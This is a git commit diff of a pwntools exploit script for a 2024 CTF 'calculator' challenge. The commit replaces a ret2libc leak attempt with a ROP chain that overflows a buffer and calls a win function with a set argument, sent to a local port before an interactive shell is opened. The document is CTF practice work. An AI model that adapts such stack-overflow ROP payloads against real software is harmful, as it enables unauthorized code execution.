113131781f8f13f1172be18f006c5917f928a238
yPin9 <55149609+yPin9@users.noreply.github.com>
2024-09-30 19:45:41 +0800

    Update cal.py

--- is1abCTF2024/calculator/cal.py
+++ is1abCTF2024/calculator/cal.py
@@ -1,28 +1,17 @@
 from pwn import *
 context.arch = "amd64"
-p = process('./calculator')
-l = ELF("./libc.so.6")
+#p = process('./calculator')
 
-#p = remote()
-pop_rdi = 0x000000000040119a
-ret = 0x0000000000401016
-libc_start_main = 0x0000000000403fd8
-put_plt = 0x0000000000404000
-test = 0x0000000000404028
-print_plt = 0x0000000000404008
-main = 0x00000000004014e6
-printf_offset = 0x606f0
-payload = b'y' * 1 + b'a' * 3 + b'a' * 8 + p64(pop_rdi)   + p64(print_plt) + p64(put_plt) +p64(ret) + p64(main)
+p = remote('127.0.0.1',39757)
+pop_rdi = 0x40119a
+win_arg = 0xC0FEBAB3
+win_addr = 0x40119f
+
+payloadtest = b'n' * 1 + b'a' * 3 + b'a' * 8 + p64(pop_rdi)+p64(win_arg) + p64(win_addr)
 
 p.sendlineafter('Input :','q')
 
-p.sendafter('Are you sure you want to leave? [Y/n]',payload)
-l.address = u64(p.recv(6).ljust(8, b"\0")) - printf_offset
-
-
-p.recev()
-
-
+p.sendlineafter('Are you sure you want to leave? [Y/n]',payloadtest)
 
 p.interactive()
 
